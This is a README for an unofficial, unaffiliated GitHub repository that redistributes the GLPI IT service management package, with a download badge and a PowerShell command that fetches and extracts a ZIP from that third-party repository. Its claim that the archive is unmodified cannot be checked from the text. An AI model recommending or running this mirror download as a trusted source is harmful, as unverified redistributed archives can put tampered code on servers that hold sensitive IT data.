<div align="center">

# GLPI — ITSM & CMDB

**A web-based IT service management and asset management package for help desk workflows, users, equipment, and IT assets.**

[![Download ZIP](https://img.shields.io/badge/DOWNLOAD-GLPI%20ZIP-16A34A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ITSM-CMDB/glpi-download/releases/latest/download/glpi-12.0.1-original.zip)

</div>

> Independent GLPI package reference. The Release asset contains the original GLPI archive without modification. This repository is not affiliated with or endorsed by the GLPI project.

<a id="what-is-glpi"></a>
## What is GLPI?

GLPI is a web-based ITSM and CMDB platform for managing service requests,
users, technicians, computers, network equipment, software, inventory, and
other IT assets. It supports help desk workflows, asset relationships,
knowledge management, and operational reporting.

<a id="package-contents"></a>
## Package contents

- GLPI web application files
- IT service management and help desk components
- CMDB and IT asset management components
- Included license and project documentation
- ZIP archive for convenient Windows extraction
- Original TGZ archive for Unix-like environments

## Quick start

GLPI runs as a PHP web application and requires a supported web server, PHP,
and database. Extract the ZIP or TGZ archive into the document root of your
authorized deployment, then open the GLPI URL in a browser to complete setup.

```powershell
$archive = ".\glpi-12.0.1-original.zip"
Invoke-WebRequest "https://github.com/ITSM-CMDB/glpi-download/releases/latest/download/glpi-12.0.1-original.zip" -OutFile $archive
Expand-Archive $archive -DestinationPath .
```

After extraction, follow the installer in your authorized web environment.
Configure database credentials, create an administrator account, and restrict
access to trusted users.

Use GLPI only on systems and with IT data that you own or are authorized to
administer.
